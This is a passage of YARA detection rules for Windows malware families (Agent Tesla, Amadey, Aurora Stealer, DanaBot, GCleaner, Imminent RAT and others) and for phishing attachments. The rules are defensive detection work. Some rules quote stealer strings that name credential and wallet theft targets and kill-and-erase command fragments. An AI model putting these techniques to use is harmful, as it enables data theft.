      $ac2 = { FF FF FF FF FF FF FF FF FF FF FF FF FF FF B9 DE
               FA 68 B8 F4 39 A2 F1 39 A2 F1 39 A2 F1 39 A2 F1
               39 A2 F1 39 A2 F1 68 B8 F4 B9 DE FA FF FF FF FF
               FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF }

      /* strings to expect in a HxD executable */
      $s1 = { 00 4D 00 61 00 EB 00 6C 00 20 00 48 00 F6 00 72 00 7A } /* Developer: Maael Hoerz */
      $s2 = "mh-nexus.de" ascii wide

      /* UPX marker */
      $upx1 = "UPX0" ascii fullword

      /* Keywords that are known to appear in malicious  samples */
      $xs1 = "terminator" ascii wide fullword // https://www.linkedin.com/feed/update/urn:li:activity:7068631930040188929/?utm_source=share&utm_medium=member_ios
      $xs2 = "Terminator" ascii wide fullword // https://www.linkedin.com/feed/update/urn:li:activity:7068631930040188929/?utm_source=share&utm_medium=member_ios
   condition:
      // HxD indicators
      uint16(0) == 0x5a4d 
      and 1 of ($ac*)
      // Anomalies
      and (
         not 1 of ($s*) // not one of the expected strings
         or filesize > 6930000 // no legitimate sample bigger than 6.6MB
         // all legitimate binaries have a known size and shouldn't be smaller than ...
         or ( pe.is_32bit() and filesize < 1540000 and not $upx1 )
         or ( pe.is_32bit() and filesize < 590000 and $upx1 )
         or ( pe.is_64bit() and filesize < 6670000 and not $upx1 )
         or ( pe.is_64bit() and filesize < 1300000 and $upx1 )
         // keywords expected in malicious samples
         or 1 of ($xs*)
      )
}rule SUSP_ZIP_LNK_PhishAttachment {
    meta:
        description = "Detects suspicius tiny ZIP files with malicious lnk files"
        author = "ignacior"
        reference = "Internal Research"
        date = "2022-06-23"
        score = 50
        yarahub_uuid = "fbb7c8e8-55b6-4192-877b-3dbaad76e12e"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "a457d941f930f29840dc8219796e35bd"
    strings:
        $sl1 = ".lnk"
    condition:
		uint16(0) == 0x4b50 and filesize < 2KB and $sl1 in (filesize-256..filesize)
}
rule SUS_UNC_InEmail
{
	meta:
		author = "Nicholas Dhaeyer - @DhaeyerWolf"
		date = "2023-05-15"
		description = "Looks for a suspicious UNC string in .eml files & .ole files"
		yarahub_uuid = "7df969ed-49f8-4c52-be25-6511d6dcc37f"
		yarahub_license = "CC BY-SA 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "1ac728095ebedb5d25bea43e69014bc4"
	  
	strings:
		$MAGIC_MSG = {D0 CF 11 E0 A1 B1 1A E1} // sadly the .msg message byte is the same as the one for other OLE files
		$MAGIC_EML = {52 65 63 65 69 76 65 64 3A} // Magic byte for .eml files: "Received:"
		$MAGIC_ICS = {42 45 47 49 4E 3A 56 43 41 4C 45 4E 44 41 52} // "BEGIN:VCALENDAR"
		
		$Appointment = "IPM.Appointment"
		
		$UNC = {00 5C 5C} 
	  
	condition:
		$UNC and ($MAGIC_MSG at 0 or $MAGIC_EML at 0 or $MAGIC_ICS at 0) and $Appointment
}rule SUS_Unsigned_APPX_MSIX_Installer_Feb23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects suspicious, unsigned Microsoft Windows APPX/MSIX Installer Packages"
		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
		date = "2023-02-01"
		tlp = "CLEAR"
		yarahub_reference_md5 = "69660f5abb08fc430cf756a44d19e039"
		yarahub_uuid = "3eaac733-4ab9-40e1-93fe-3dbed6d458e8"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		$s_manifest = "AppxManifest.xml"
		$s_block = "AppxBlockMap.xml"
		$s_peExt = ".exe"

		// we are not looking for signed packages
		$sig = "AppxSignature.p7x"

	condition:
		uint16be(0x0) == 0x504B
		and 2 of ($s*)
		and not $sig
}
rule SUS_Unsigned_APPX_MSIX_Manifest_Feb23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects suspicious Microsoft Windows APPX/MSIX Installer Manifests"
		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
		date = "2023-02-01"
		tlp = "CLEAR"
		yarahub_reference_md5 = "69660f5abb08fc430cf756a44d19e039"
		yarahub_uuid = "06b5fba4-6b6d-41f8-9910-cce86eabbde4"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		$xlmns = "http://schemas.microsoft.com/appx/manifest/"
		
		// as documented here: https://learn.microsoft.com/en-us/windows/msix/package/unsigned-package
		$identity = "OID.2.25.311729368913984317654407730594956997722=1"
		
		$s_entrypoint = "EntryPoint=\"Windows.FullTrustApplication\""
		$s_capability = "runFullTrust"
		$s_peExt = ".exe"

	condition:
		uint32be(0x0) == 0x3C3F786D
		and $xlmns
		and $identity
		and 2 of ($s*)
}rule SVCReady_Packed
{
    meta:
        author                    = "Andre Gironda"
        date                      = "2022-06-08"
        description               = "packed SVCReady / win.svcready"
        hash                      = "326d50895323302d3abaa782d5c9e89e7ee70c3a4fbd5e49624b49027af30cc5"
        hash2                     = "76d69ec491c0711f6cc60fbafcabf095"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "andreg@gmail.com"
        yarahub_author_twitter    = "@AndreGironda"
        yarahub_license           = "CC0 1.0"
        yarahub_reference_md5     = "76d69ec491c0711f6cc60fbafcabf095"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "db8e2535-efef-4ada-a67f-919970546b1e"
   strings:
        $hex_1003b3e0 = { 52 75 6e 50 45 44 6c 6c 4e 61 74 69 76 65 3a 3a 46 69 6c 65 20 68 61 73 20 6e 6f 20 72 65 6c 6f 63 61 74 69 6f 6e }
        $hex_1003b424 = { 50 61 79 6c 6f 61 64 20 64 65 70 6c 6f 79 6d 65 6e 74 20 66 61 69 6c 65 64 2c 20 73 74 6f 70 70 69 6e 67 }
        $hex_1003c234 = { 4e 6f 74 20 73 75 70 70 6f 72 74 65 64 20 72 65 6c 6f 63 61 74 69 6f 6e 73 20 66 6f 72 6d 61 74 20 61 74 20 25 64 3a 20 25 64 0a 00 5b 2d 5d 20 }
        $hex_1003c2cc = { 49 6e 76 61 6c 69 64 20 61 64 64 72 65 73 73 20 6f 66 20 72 65 6c 6f 63 61 74 69 6f 6e 73 20 62 6c 6f 63 6b }
   condition:
        all of them
}
rule tofsee_yhub {
    meta:
        date = "2022-10-23"
        yarahub_uuid = "a2863cf2-6b6e-42e4-b78a-7e3fe72659ce"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "92e466525e810b79ae23eac344a52027"
        yarahub_author_twitter = "@billyaustintx"
        author = "Billy Austin"
        description = "Detects Tofsee botnet, also known as Gheg"
        malpedia_family = "Tofsee"
    strings:
        $s1 = "Too many errors in the block" ascii
        $s2 = "%OUTLOOK_BND_" ascii
        $s3 = "no locks and using MX is disabled" ascii
        $s4 = "mx connect error" ascii
        $s5 = "Too big smtp respons" ascii
        $s6 = "INSERT_ORIGINAL_EMAIL" ascii
        $s7 = "integr_nl = %d" ascii
        $s8 = "mail.ru" ascii
        $s9 = "smtp_herr" ascii
        $s10 = "%OUTLOOK_MID" ascii

    condition:
        uint16(0) == 0x5a4d and filesize < 200KB and 7 of ($s*)
}rule unk_phishkit {
	meta:
		author = "James E.C, Proofpoint"
		description = "Unknown phishkit"
		date = "2022-07-06"
		yarahub_uuid = "c6d0afdc-2d5e-4674-bca0-5e6738c22bca"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "7639fdbeac0f75cbcbd9b623a8a6b0d6"
	strings:
		$hp1 = "function validateMyForm()" ascii
		$hp2 = ".getElementById(\"honeypot\").value" ascii

		$kit1 = /<form action=\"[A-Za-z0-9]{2,8}\.php\"/
		$kit2 = "onSubmit=\"return validateMyForm();" ascii
		$kit3 = "id='_form_" ascii
		$kit4 = "enctype='multipart/form-data'" ascii
	condition:
		filesize < 50KB and all of them
}rule win_agent_tesla_ab4444e9 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2020-10-01"
        description               = "detects Agent Tesla"
        hash                      = "dcd7323af2490ceccfc9da2c7f92c54a"
        malpedia_family           = "win.agent_tesla"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "dcd7323af2490ceccfc9da2c7f92c54a"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "ab4444e9-18b1-4920-b105-35377741899f"

    strings:
        $string_1  = "get_CHoo"
        $string_2  = "get_Lenght"
        $string_3  = "get_kbok"
        $string_4  = "get_sSL"
        $string_5  = "get_useSeparateFolderTree"
        $string_6  = "set_AccountCredentialsModel"
        $string_7  = "set_BindingAccountConfiguration"
        $string_8  = "set_CHoo"
        $string_9  = "set_CreateNoWindow"
        $string_10 = "set_IdnAddress"
        $string_11 = "set_IsBodyHtml"
        $string_12 = "set_Lenght"
        $string_13 = "set_MaximumAutomaticRedirections"
        $string_14 = "set_UseShellExecute"
        $string_15 = "set_disabledByRestriction"
        $string_16 = "set_kbok"
        $string_17 = "set_sSL"
        $string_18 = "set_signingEncryptionPreset"
        $string_19 = "set_useSeparateFolderTree"

    condition:
        uint16(0) == 0x5A4D and
        15 of ($string_*)
}
rule win_amadey_a9f4 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-11-17"
        description               = "matches unpacked Amadey samples"
        hash_md5                  = "25cfcfdb6d73d9cfd88a5247d4038727"
        hash_sha1                 = "912d1ef61750bc622ee069cdeed2adbfe208c54d"
        hash_sha256               = "03effd3f94517b08061db014de12f8bf01166a04e93adc2f240a6616bb3bd29a"
        malpedia_family           = "win.amadey"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "25cfcfdb6d73d9cfd88a5247d4038727"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "a9f41cd4-3f67-42fc-b310-e9b251c95fe4"

    strings:
        $pdb  = "\\Amadey\\Release\\Amadey.pdb"
        /*  Amadey uses multiple hex strings to decrypt the strings, C2 traffic
            and as identification. The preceeding string 'stoi ...' is added to
            improve performance.
        */
        $keys = /stoi argument out of range\x00\x00[a-f0-9]{32}\x00{1,16}[a-f0-9]{32}\x00{1,4}[a-f0-9]{6}\x00{1,4}[a-f0-9]{32}\x00/

    condition:
        uint16(0) == 0x5A4D and
        (
            $pdb or $keys
        )
}

rule win_amadey_bytecodes_oct_2023
{
	meta:	
		author = "Matthew @ Embee_Research"
		yarahub_author_twitter = "@embee_research"
		desc = "Detects bytecodes present in Amadey Bot Samples"
		sha_256 = "4165190e60ad5abd437c7768174b12748d391b8b97c874b5bdf8d025c5e17f43"
		date = "2023-10-15"
        yarahub_uuid = "19e955f9-d125-41af-981b-09957a8abbc8"
       	yarahub_license = "CC BY-NC 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "2ba1411c46d529f2ae6a7c154d13f029"
        malpedia_family = "win.amadey"

		
	strings:
		$s1 = {8b ?? fc 83 c1 23 2b c2 83 c0 fc 83 f8 1f 77}
		$s2 = {80 ?? ?? ?? 3d 75 }
		$s3 = {8b c1 c1 f8 10 88 ?? ?? 8b c1 c1 f8 08}
		
	condition:
		
		$s1 and $s2 and $s3
		

}rule win_aurora_stealer_a_706a {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-12-14"
        description               = "detects Aurora Stealer samples"
        hash1_md5                 = "51c153501e991f6ce4901e6d9578d0c8"
        hash1_sha1                = "3816f17052b28603855bde3e57db77a8455bdea4"
        hash1_sha256              = "c148c449e1f6c4c53a7278090453d935d1ab71c3e8b69511f98993b6057f612d"
        hash2_md5                 = "65692e1d5b98225dbfb1b6b2b8935689"
        hash2_sha1                = "0b51765c175954c9e47c39309e020bcb0f90b783"
        hash2_sha256              = "5a42aa4fc8180c7489ce54d7a43f19d49136bd15ed7decf81f6e9e638bdaee2b"
        malpedia_family           = "win.aurora_stealer"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "51c153501e991f6ce4901e6d9578d0c8"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "706a5977-69fb-44ae-bfa7-f61e214148e7"

    strings:

        $str_func_01 = "main.(*DATA_BLOB).ToByteArray"
        $str_func_02 = "main.Base64Encode"
        $str_func_03 = "main.Capture"
        $str_func_04 = "main.CaptureRect"
        $str_func_05 = "main.ConnectToServer"
        $str_func_06 = "main.CreateImage"
        $str_func_07 = "main.FileExsist"
        $str_func_08 = "main.GetDisplayBounds"
        $str_func_09 = "main.GetInfoUser"
        $str_func_10 = "main.GetOS"
        $str_func_11 = "main.Grab"
        $str_func_12 = "main.MachineID"
        $str_func_13 = "main.NewBlob"
        $str_func_14 = "main.NumActiveDisplays"
        $str_func_15 = "main.PathTrans"
        $str_func_16 = "main.SendToServer_NEW"
        $str_func_17 = "main.SetUsermame"
        $str_func_18 = "main.Zip"
        $str_func_19 = "main.base64Decode"
        $str_func_20 = "main.countupMonitorCallback"
        $str_func_21 = "main.enumDisplayMonitors"
        $str_func_22 = "main.getCPU"
        $str_func_23 = "main.getDesktopWindow"
        $str_func_24 = "main.getGPU"
        $str_func_25 = "main.getMasterKey"
        $str_func_26 = "main.getMonitorBoundsCallback"
        $str_func_27 = "main.getMonitorRealSize"
        $str_func_28 = "main.sysTotalMemory"
        $str_func_29 = "main.xDecrypt"

        $str_type_01 = "type..eq.main.Browser_G"
        $str_type_02 = "type..eq.main.STRUSER"
        $str_type_03 = "type..eq.main.Telegram_G"
        $str_type_04 = "type..eq.main.Crypto_G"
        $str_type_05 = "type..eq.main.ScreenShot_G"
        $str_type_06 = "type..eq.main.FileGrabber_G"
        $str_type_07 = "type..eq.main.FTP_G"
        $str_type_08 = "type..eq.main.Steam_G"
        $str_type_09 = "type..eq.main.DATA_BLOB"
        $str_type_10 = "type..eq.main.Grabber"

        $varia_01 = "\\User Data\\Local State"
        $varia_02 = "\\\\Opera Stable\\\\Local State"
        $varia_03 = "Reconnect 1"
        $varia_04 = "@ftmone"
        $varia_05 = "^user^"
        $varia_06 = "wmic path win32_VideoController get name"
        $varia_07 = "\\AppData\\Roaming\\Telegram Desktop\\tdata"
        $varia_08 = "C:\\Windows.old\\Users\\"
        $varia_09 = "ScreenShot"
        $varia_10 = "Crypto"

    condition:
        uint16(0) == 0x5A4D and
        (
            32 of ($str_*) or
            9 of ($varia_*)
        )
}
rule win_bitcoin_genesis_b9_ce9f {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-07-22"
        description               = "detects a downloader with a DGA based on the Bitcoin Genesis Block"
        hash_md5                  = "5c13ee5dbe45d02ed74ef101b2e82ae6"
        hash_sha1                 = "bdc36bc233675e7a96faa2c4917e9b756cc2a2a0"
        hash_sha256               = "ad1e39076212d8d58ff45d1e24d681fe0c600304bd20388cddcf9182b1d28c2f"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "5c13ee5dbe45d02ed74ef101b2e82ae6"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "ce9f9e49-464a-489b-90fb-d4c81e98e360"

    strings:
        $str_json_1 = "\"bytes\": ["
        $str_json_2 = "\"subtype\": "
        $str_json_3 = "{\"bytes\":["
        $str_json_4 = "],\"subtype\":"
        $str_json_5 = "null}"
        $str_json_6 = "<discarded>"
        $str_json_7 = "[json.exception."

        /*
            mov     dl, [ebp+var_14]
            mov     [eax+ecx], dl
            mov     byte ptr [eax+ecx+1], 0
            jmp     short loc_3CBF9F
        */
        $split_hash_1 = {8A 55 ?? 88 14 08 C6 44 08 01 00 EB}
        /*
            inc     ebx
            cmp     ebx, 10h
            jl      loc_3CBF10
        */
        $split_hash_2 = {43 83 FB 10 0F 8C}

        /*
            push    0
            push    0
            mov     [ebp-14h], edx
            mov     [ebp-18h], eax
        */
        $format_the_date = {6A 00 6A 00 89 55 EC 89 45 E8}

    condition:
        uint16(0) == 0x5A4D and
        all of ($str_json_*) and
        all of ($split_hash_*) and
        $format_the_date
}
rule win_colibriloader : packed loader 
{
  meta:
    author =                    "andretavare5"
    org =                       "BitSight"
    date =                      "2022-09-21"
    description =               "Packed ColibriLoader malware"
    yarahub_author_twitter =    "@andretavare5"
    yarahub_reference_link =    "https://fr3d.hk/blog/colibri-loader-back-to-basics"
    yarahub_malpedia_family =   "win.colibri"
    yarahub_uuid =              "287f394b-2160-4f36-8ab7-bfb95fc75355"
    yarahub_license =           "CC BY-NC-SA 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp =  "TLP:WHITE"
    yarahub_reference_md5 =     "e0a68b98992c1699876f818a22b5b907"
    
  strings:
    $str1 = "NtUnmapViewOfSct"
    $str2 = "RtlAllocateHeap"
    $str3 = "user32.dll"
    $str4 = "kernel32.dll"
                              
  condition:
    uint16(0) == 0x5A4D and // MZ
    all of them
}rule win_colibriloader_unpacked : loader
{
  meta:
    author =      "andretavare5"
    description = "ColibriLoader malware"
    org =         "BitSight"
    date =        "2022-11-22"
    md5 =         "f1bbf3a0c6c52953803e5804f4e37b15"
    reference =   "https://malpedia.caad.fkie.fraunhofer.de/details/win.colibri"
    license =     "CC BY-NC-SA 4.0"

	yarahub_author_twitter =    "@andretavare5"
    yarahub_reference_link =    "https://fr3d.hk/blog/colibri-loader-back-to-basics"
    yarahub_malpedia_family =   "win.colibri"
    yarahub_uuid =              "1dcc7399-8e13-4a21-9fec-fb1e08c640a6"
    yarahub_license =           "CC BY-NC-SA 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp =  "TLP:WHITE"
    yarahub_reference_md5 =     "f1bbf3a0c6c52953803e5804f4e37b15"
    
  strings:
  	// str decrypt loop
    // --------------------------
    // xor     edx, edx
    // mov     eax, ebx
    // div     [ebp+key_len]
    // mov     ax, [esi+edx*2]
    // xor     ax, [edi+ecx]
    // inc     ebx
    // mov     [ecx], ax
    // lea     ecx, [ecx+2]
    // cmp     ebx, [ebp+str_len]
    // jb      short loc_40596A
    $x = {33 D2 8B C3 F7 75 14 66 8B 04 56 66 33 04 0F 43 66 89 01 8D 49 02 3B 5D 0C 72 E5} 
                              
  condition:
    uint16(0) == 0x5A4D and // MZ
    all of them
}rule win_danabot_cdf38827 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-04-19"
        description               = "detects DanaBot"
        hash1                     = "b7f891f4ed079420e16c4509680cfad824b061feb94a0d801c96b82e1f7d52ad"
        hash1b                    = "62174157b42e5c8c86b05baf56dfd24b"
        hash2                     = "c8f27c0e0d4e91b1a6f62f165d45d8616fc24d9c798eb8ab4269a60e29a2de5e"
        hash3                     = "5cb70c87f0b98279420dde0592770394bf8d5b57df50bce4106d868154fd74cb"
        malpedia_family           = "win.danabot"
        tlp                       = "TLP:WHITE"
        version                   = "v1.1"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "62174157b42e5c8c86b05baf56dfd24b"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "cdf38827-649c-4194-85b0-881c98f1c562"

    strings:
        $keyboard = { C6 05 [4] 71 C6 05 [4] 77 C6 05 [4] 65 C6 05 [4] 72 C6 05 [4] 74 C6 05 [4] 79 C6 05 [4] 75 C6 05 [4] 69 C6 05 [4] 6F  }
        $move_y   = { 8B 45 F8 C6 80 [4] 79 } // mov     eax, [ebp-8], mov     byte ptr <addr>[eax], 79h
        $id_str   = /[A-F0-9]{32}zz/

    condition:
        uint16(0) == 0x5A4D and
        (
            all of them
        )
}
rule Win_DarkGate
{
	meta:
		author = "0xToxin"
		description = "DarkGate Strings Decryption Routine"
		date = "2023-08-01"
		yarahub_reference_md5 = "152ea1d672c7955f3da965dc320dc170"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_uuid = "9e190198-c38c-405b-a810-0a4c1b5b6db0"
	strings:
		$chunk_1 = {
			8B 55 ??
			8A 4D ??
			80 E1 3F
			C1 E1 02
			8A 5D ??
			80 E3 30
			81 E3 FF 00 00 00
			C1 EB 04
			02 CB
			88 4C 10 ??
			FF 45 ??
			80 7D ?? 40
			74 ??
			8B 45 ??
			E8 ?? ?? ?? ??
			8B 55 ??
			8A 4D ??
			80 E1 0F
			C1 E1 04
			8A 5D ??
			80 E3 3C
			81 E3 FF 00 00 00
			C1 EB 02
			02 CB
			88 4C 10 ??
			FF 45 ??
			80 7D ?? 40
			74 ??
			8B 45 ??
			E8 ?? ?? ?? ??
			8B 55 ??
			8A 4D ??
			80 E1 03
			C1 E1 06
			8A 5D ??
			80 E3 3F
			02 CB
			88 4C 10 ??
			FF 45 ??
		}
	
	condition:
		any of them
}
rule win_erbium_stealer_a1_2622 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-09-01"
        description               = "detects the unpacked Erbium stealer"
        hash1_md5                 = "e719388778f14e77819a62c5759d114b"
        hash1_sha1                = "540fe15ae176cadcfa059354fcdfe59a41089450"
        hash1_sha256              = "d932a62ab0fb28e439a5a7aab8db97b286533eafccf039dd079537ac9e91f551"
        hash2_md5                 = "74f53a6ad69f61379b6ca74144b597e6"
        hash2_sha1                = "f188b5edc93ca1e250aee92db84f416b1642ec7f"
        hash2_sha256              = "d45c7e27054ba5d38a10e7e9d302e1d6ce74f17cf23085b65ccfba08e21a8d0b"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "e719388778f14e77819a62c5759d114b"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "2622fa81-d545-4b34-918c-ddc9c16d9b48"

    strings:
        $str_path            = "ErbiumDed/api.php?method=getstub&bid=" wide
        $str_tag             = "malik_here" ascii
        $fowler_noll_vo_hash = {C5 9D 1C 81 [1-100] 93 01 00 01}

    condition:
        uint16(0) == 0x5A4D and
        (
            all of ($str_*) and #fowler_noll_vo_hash >= 2
        )
}
rule win_Eternity
{
	meta:
		author = "0xToxin"
		description = "Eternity function routines"
		date = "2022-12-10"
		yarahub_reference_md5 = "cb1b7d3a9bd4f3742c3b8c4c21c808b8"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		malpedia_family = "win.eternity_stealer"
		yarahub_uuid = "8af629d9-206a-4d75-acd2-f6b21ae9b4ac"
	strings:
		$string_xor_routine = {
			5D
			?? ?? 00 00 0A
			61
			D1
		}
		
		$switch_case = {
			FE 0C 00 00
			FE 0C 01 00
			93
			?? ?? 00 00 0A
		}
	condition:
		uint16(0) == 0x5a4d and $string_xor_routine and #switch_case >= 3
	}rule win_gcleaner_de41 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-05-29"
        description               = "detects GCleaner"
        hash1_md5                 = "8151e61aec021fa04bce8a30ea052e9d"
        hash1_sha1                = "4b972d2e74a286e9663d25913610b409e713befd"
        hash1_sha256              = "868fceaa4c01c2e2ceee3a27ac24ec9c16c55401a7e5a7ca05f14463f88c180f"
        hash2_md5                 = "7526665a9d5d3d4b0cfffb2192c0c2b3"
        hash2_sha1                = "13bf754b44526a7a8b5b96cec0e482312c14838c"
        hash2_sha256              = "bb5cd698b03b3a47a2e55a6be3d62f3ee7c55630eb831b787e458f96aefe631b"
        hash3_md5                 = "a39e68ae37310b79c72025c6dfba0a2a"
        hash3_sha1                = "ae007e61c16514a182d21ee4e802b7fcb07f3871"
        hash3_sha256              = "c5395d24c0a1302d23f95c1f95de0f662dc457ef785138b0e58b0324965c8a84"
        malpedia_family           = "win.gcleaner"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "8151e61aec021fa04bce8a30ea052e9d"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "de41ff50-28a7-4a09-86dc-f737f8858354"

    strings:
        $accept = "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"
        $accept_lang = "Accept-Language: ru-RU,ru;q=0.9,en;q=0.8"
        $accept_charset = "Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1"
        $accept_encoding = "Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0"

        $unkown = "<unknown>"
        $cmd1 = "\" & exit"
        $cmd2 = "\" /f & erase "
        $cmd3 = "/c taskkill /im \""

        $anti1 = " Far "
        $anti2 = "roxifier"
        $anti3 = "HTTP Analyzer"
        $anti4 = "Wireshark"
        $anti5 = "NetworkMiner"

        $mix1 = "mixshop"
        $mix2 = "mixtwo"
        $mix3 = "mixnull"
        $mix4 = "mixazed"

    condition:
        uint16(0) == 0x5A4D and
        15 of them
}
rule win_imminentrat_j1_7e208e97 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2021-10-01"
        description               = "detects the imminent rat"
        hash1                     = "a728603061b5aa98fa40fb0447ba71e3"
        hash2                     = "5d8446a23b80e9b6cb7406c2ba81d606685cf11b24e9eb8309153a47b04f3aad"
        malpedia_family           = "win.imminent_monitor_rat"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "a728603061b5aa98fa40fb0447ba71e3"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "7e208e97-3295-4714-8797-6e0f56c7c354"

    strings:
        $str_mining_1 = "Downloading miner data" wide
        $str_mining_2 = "This client is already mining" wide
        $str_mining_3 = "Started mining successfully" wide
        $str_mining_4 = "Unable to start mining" wide
        $str_mining_5 = "-o {0} -u {1} -p {2} -a scrypt -I {3} -T {4}" wide

        $str_plugin_1 = "\\Imminent\\Plugins\\" wide

        $str_fingerprint_1 = "Screens: {0}" wide
        $str_fingerprint_2 = "Battery: {0}" wide
        $str_fingerprint_3 = "Ram Usage: {0}%" wide
        $str_fingerprint_4 = "Last Reboot: {0}" wide
        $str_fingerprint_5 = "Graphics Card: {0}" wide
        $str_fingerprint_6 = "Firewall: {0}" wide
        $str_fingerprint_7 = "Anti-Virus: {0}" wide
        $str_fingerprint_8 = "Unique Identifier: {0}" wide
        $str_fingerprint_9 = "Privileges: {0}" wide
        $str_fingerprint_10 = "MAC Address: {0}" wide
        $str_fingerprint_11 = "Client Location: {0}" wide
        $str_fingerprint_12 = "Ram: {0}" wide
        $str_fingerprint_13 = "LAN: {0}" wide
        $str_fingerprint_14 = "Processor: {0}" wide
        $str_fingerprint_15 = "Computer Username: {0}" wide
        $str_fingerprint_16 = "Operating System: {0}" wide
        $str_fingerprint_17 = "Client Identifier: {0}" wide
        $str_fingerprint_18 = "Computer Name: {0}" wide

        $str_filedownload_1 = "File downloaded & executed" wide
        $str_filedownload_2 = "File downloaded & updated" wide

    condition:
        uint16(0) == 0x5A4D and
        3 of ($str_mining_*) and
        $str_plugin_1 and
        15 of ($str_fingerprint_*) and
        all of ($str_filedownload_*)
}
rule win_laplas_clipper_9c96 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-11-09"
        description               = "detects unpacked Laplas Clipper"
        hash1_md5                 = "3afb4573dea2dbac4bb5f1915f7a4dce"
        hash1_sha1                = "9ad8b880f3ab35f0d1a7fe46d9d8e0bea36e0d14"
        hash1_sha256              = "52901dc481d1be2129725e3c4810ae895f9840e27a1dce69630dedcf71b6c021"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
